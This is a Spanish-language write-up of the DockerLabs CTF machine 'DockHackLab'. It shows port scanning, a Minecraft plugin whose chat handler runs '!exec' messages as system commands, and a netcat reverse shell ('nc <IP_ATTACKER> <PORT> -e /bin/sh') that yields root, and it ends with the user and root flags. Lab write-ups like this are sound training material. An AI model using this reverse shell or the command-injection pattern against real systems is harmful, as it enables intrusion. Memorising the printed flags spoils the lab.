# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: Hard](https://img.shields.io/badge/Dificultad-Hard-%23FF0000?style=for-the-badge)

---

## 🔍 1. Fase de Enumeración

### Escaneo de Puertos
Iniciamos realizando un escaneo de puertos sobre la dirección IP de la víctima para identificar servicios activos.

```bash

# Identificación rápida de puertos abiertos
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>

# Escaneo profundo de versiones y scripts por defecto
nmap -sCV -p 80,25565 <IP>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 04:23 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000037s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: HTTrack Website Copier/3.x
|_http-title: Local index - HTTrack Website Copier
|_http-server-header: Apache/2.4.58 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.12.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
MAC Address: 02:42:AC:11:00:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds
```

#Resultados del escaneo:

 80/tcp (HTTP): Apache httpd 2.4.58. El sitio parece haber sido clonado con HTTrack.

 25565/tcp (Minecraft): Servidor Minecraft activo versión 1.12.2.

# Análisis Web e Infiltración
Al explorar el puerto 80, encontramos una página web de Minecraft. Inspeccionando el código fuente de la página, localizamos un comentario sospechoso en las últimas líneas:

Navegamos a la URL: http://<IP>/AutoExecPlugin.txt y encontramos el código fuente de un plugin de Java (.java).

Análisis del Código:
El código revela una función de chat que permite ejecutar comandos del sistema si el mensaje comienza con el prefijo !exec:
```ruby
@EventHandler
public void onPlayerChat(AsyncPlayerChatEvent event) {
    String msg = event.getMessage();
    if (msg.startsWith("!exec ")) {
        String command = msg.substring(6); 
        try {
            // EJECUCIÓN CRÍTICA: Command Injection
            Process proc = Runtime.getRuntime().exec(command); 
            // ... captura de salida y envío al jugador
        } catch (Exception e) { ... }
    }
}
```
🎮 2. Instalación del Cliente Minecraft
Para interactuar con el servidor, instalamos TLauncher (versión gratuita para Linux).

Descarga: https://tlauncher.org/

Instalación:


<img width="694" height="340" alt="image" src="https://github.com/user-attachments/assets/b200b6fa-8312-47c5-b495-6d1e8c0fe4bf" />

Le daremos a TLauncher for Linux para que nos lo descargue, esto nos descargara un .zip el cual vamos a extraer de esta forma.

```bash
cd /home/<USERNAME>/Download
unzip <FILE>.zip
```
Una vez extraido veremos lo siguiente en la carpeta llamada TLauncher.v16:

```bash
cd TLauncher.v16/
ls -la

Info:


Copy
total 9904
drwxrwxr-x 2 kali kali     4096 Jun 17 12:50 .
drwxr-xr-x 3 kali kali     4096 Jun 17 16:54 ..
-rw-rw-r-- 1 kali kali     2198 Dec 10  2024 README-EN.txt
-rw-rw-r-- 1 kali kali     3235 Dec 10  2024 README-RUS.txt
-rw-rw-r-- 1 kali kali 10121689 May  4 06:37 TLauncher.jar
```
Lo importante es el archivo TLauncher.jar que es el que inicia Minecraft por lo que tendremos que ejecutarlo de esta forma.


```java
java -jar tlauncher.jar
```
Esto instalara Minecraft y abrira el launcher para iniciarlo, dentro del mismo tendremos que elegir el nombre de usuario que puede ser cualquiera y muy importante la version, en el reporte de nmap vimos que la version es Minecraft 1.12.2 por lo que tendremos que elegir la llamada release 1.12.2 y darle a Install.

Eso instalara todo lo necesario para jugarla, una vez que se haya instalado todo nos pondra Enter the game le daremos y despues de un rato estaremos dentro del menu de Minecraft, nos iremos a la opcion llamada Multiplayer y dentro del mismo configuraremos el servidor de Miencraft desde donde esta corriendo la maquina victima.

Le daremos al boton llamado Add Server y dentro del mismo veremos el Server Name y el Server Address el que nos interesa es configurar el Server Adderess por lo que tendremos que poner la IP de la maquina victima junto con el puerto que es el 25565 quedando de esta forma:

<img width="637" height="459" alt="image" src="https://github.com/user-attachments/assets/d3561a21-b69d-4c95-9b08-635d282be131" />


Le daremos a Done y si refrescamos tendremos que ver el server activo asi:

<img width="606" height="183" alt="image" src="https://github.com/user-attachments/assets/4a581914-ba31-4a01-9770-4b9374b4976e" />


Ahora seleccionaremos el servidor y le daremos al boton llamado Join Server esto nos metera dentro del mundo de Minecraft del servidor.

# 🚀 3. Escalada de Privilegios y Explotación (RCE)

Una vez dentro del servidor de Minecraft, procedemos a enumerar los plugins instalados para confirmar la superficie de ataque:
Escalate Privileges
Una vez dentro del mundo vamos a probar a listar los plugins de esta forma desde Minecraft.
```bash
/pl
```
```ruby
Plugins (2): AutoOpPlugin, AutoExecPlugin
```

Vemos que esta el plugin que encontramos del .txt por lo que vamos a probar a ejecutar lo que mencionaba en el .txt para poder ejecutar comandos con !exec acompañado de un comando del sistema.

```ruby
!exec whoami
```
<img width="126" height="39" alt="image" src="https://github.com/user-attachments/assets/07cc219b-7c65-40f6-bf48-333cd8afe0bf" />

Vemos que se esta ejecutando de forma correcta podremos realizar un RCE, por lo que vamos a probar a generarnos una reverse shell de esta forma.


```ruby
!exec nc <IP_ATTACKER> <PORT> -e /bin/sh
```
Antes de ejecutarlo tendremos que ponernos a la escucha desde nuestra maquina host.
```ruby
nc -lvnp <IP>
```
Estando a la escucha si ejecutamos el comando anterior desde Minecraft y volvemos a donde tenemos la escucha veremos lo siguiente

```ruby
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 47064
whoami
root
```
Vemos que hemos obtenido de forma exitosa una shell desde la maquina victima mediante un plugin vulnerable desde Minecraft, sanitizaremos la shell.

# Sanitización de shell (TTY)
script /dev/null -c bash

Copy
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
Una vez echo esto leeremos la flag del usuario y de root.

user.txt
```
8725a65493f812597167d64cf85640e6
```


root.txt
```
ebcc53fe4fcaffea2fe32390021783c4
```
